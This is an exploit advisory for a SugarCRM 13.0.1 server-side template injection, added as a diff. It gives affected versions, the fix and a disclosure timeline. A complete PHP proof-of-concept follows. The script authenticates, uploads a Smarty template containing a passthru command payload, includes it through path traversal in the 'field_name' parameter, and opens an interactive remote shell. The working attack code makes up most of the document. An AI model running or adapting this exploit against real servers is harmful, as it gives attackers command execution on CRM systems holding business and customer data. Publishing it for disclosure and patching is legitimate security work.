@@ -1,0 +1,168 @@
+id: 39130
+date: 10/30/2023
+title: SugarCRM 13.0.1 Server-Side Template Injection Exploit
+author: EgiX
+cves: 
+
+----------------------------------------------------------------------------
+SugarCRM <= 13.0.1 (GetControl) Server-Side Template Injection 
+Vulnerability
+----------------------------------------------------------------------------
+
+
+[-] Software Link:
+
+https://www.sugarcrm.com
+
+
+[-] Affected Versions:
+
+Version 13.0.1 and prior versions.
+Version 12.0.3 and prior versions.
+
+
+[-] Vulnerability Description:
+
+There is a sort of Server-Side Template Injection (SSTI) vulnerability 
+affecting
+the "GetControl" action from the "Import" module. User input passed 
+through the
+"field_name" parameter is not properly sanitized before being used to 
+construct
+the path of the template to include. As such, this can be abused to 
+include and
+execute arbitrary PHP code through Path Traversal attacks.
+
+
+[-] Proof of Concept:
+
+https://karmainsecurity.com/pocs/KIS-2023-10.php
+
+(Packet Storm note: POC included at bottom)
+
+
+[-] Solution:
+
+Upgrade to version 13.0.2, 12.0.4, or later.
+
+
+[-] Disclosure Timeline:
+
+[23/04/2023] - Vendor notified
+[21/09/2023] - Fixed versions released
+[06/10/2023] - CVE identifier requested
+[26/10/2023] - Publication of this advisory
+
+
+[-] CVE Reference:
+
+The Common Vulnerabilities and Exposures project (cve.mitre.org)
+has not assigned a CVE identifier for this vulnerability.
+
+
+[-] Credits:
+
+Vulnerability discovered by Egidio Romano.
+
+
+[-] Original Advisory:
+
+https://karmainsecurity.com/KIS-2023-10
+
+
+[-] Other References:
+
+https://support.sugarcrm.com/resources/security/sugarcrm-sa-2023-010/
+
+
+
+--- KIS-2023-10.php poc  ---
+
+<?php
+
+set_time_limit(0);
+error_reporting(E_ERROR);
+
+if (!extension_loaded("curl")) die("[+] cURL extension required!\n");
+
+if ($argc != 4) die("Usage: php $argv[0] <URL> <username> <password>\n");
+
+list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]];
+
+print "[+] Logging in with username '{$user}' and password '{$pass}'\n";
+
+$ch = curl_init();
+
+$params = ["username" => $user, "password" => $pass, "grant_type" => "password", "client_id" => "sugar"];
+
+curl_setopt($ch, CURLOPT_URL, "{$url}rest/v10/oauth2/token");
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
+curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+if (($token = (json_decode(curl_exec($ch)))->access_token) == null) die("[+] Login failed!\n");
+
+print "[+] Creating new Notes bean\n";
+
+$note_id = time().".tpl";
+
+curl_setopt($ch, CURLOPT_URL, "{$url}rest/v10/Notes");
+curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json", "OAuth-Token: {$token}"]);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["id" => $note_id]));
+
+if (!preg_match('/"id":"'.$note_id.'"/', curl_exec($ch))) die("[+] Bean creation failed!\n");
+
+require_once("./lib/nusoap.php");
+$client = new nusoap_client("{$url}soap.php", false);
+
+if (($err = $client->getError()))
+{
+  echo "\nConstructor error: $err";
+  echo "\nDebug: " . $client->getDebug() . "\n";
+  die();
+}
+
+print "[+] Sending SOAP login request\n";
+
+$params = ["user_auth" => ["user_name" => $user, "password" => $pass]];
+$session = $client->call('login', $params);
+
+if ($session['id'] == -1) die("[+] SOAP login failed!\n");
+
+print "[+] Uploading template through 'set_note_attachment'\n";
+
+$params = ["session" => $session['id'], "note" => ["id" => $note_id, "file" => base64_encode("{php}passthru(\$_SERVER['HTTP_CMD']);{/php}")]];
+
+$result = $client->call("set_note_attachment", $params);
+
+print "[+] Getting PHPSESSID through BWC login\n";
+
+curl_setopt($ch, CURLOPT_URL, "{$url}rest/v10/oauth2/bwc/login");
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([]));
+curl_setopt($ch, CURLOPT_HEADER, true);
+
+if (!preg_match("/PHPSESSID=([^;]+);/", curl_exec($ch), $sid)) die("[-] Session ID not found!\n");
+
+print "[+] Launching shell\n";
+
+$note_id = substr($note_id, 0, -4);
+
+curl_setopt($ch, CURLOPT_URL, "{$url}index.php?module=Import&action=GetControl&import_module=Bugs&field_name=/test");
+curl_setopt($ch, CURLOPT_HTTPHEADER, ["Cookie: PHPSESSID={$sid[1]}"]);
+curl_setopt($ch, CURLOPT_POST, false);
+curl_setopt($ch, CURLOPT_HEADER, false);
+
+curl_exec($ch);
+
+curl_setopt($ch, CURLOPT_URL, "{$url}index.php?module=Import&action=GetControl&import_module=Bugs&field_name=/../../../../upload/{$note_id}");
+
+while(1)
+{
+    print "\nsugar-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ["CMD: ".$cmd, "Cookie: PHPSESSID={$sid[1]}"]);
+    ($r = curl_exec($ch)) ? print $r : die("\n[+] Exploit failed!\n");
+}
+
+#  0day.today [2023-10-30]  #
